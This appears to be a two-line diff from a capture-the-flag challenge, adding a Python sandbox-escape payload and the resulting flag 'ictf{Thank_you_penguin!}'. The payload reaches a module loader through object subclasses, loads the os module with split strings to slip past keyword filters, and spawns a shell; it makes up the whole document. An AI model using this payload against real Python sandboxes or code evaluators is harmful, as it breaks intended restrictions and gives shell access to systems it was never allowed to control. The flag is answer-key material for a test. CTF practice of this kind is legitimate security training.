@@ -1,0 +1,2 @@
+().__class__.__base__.__subclasses__()[84].load_module('o''s').__getattribute__('sy''stem')('sh')
+ictf{Thank_you_penguin!}
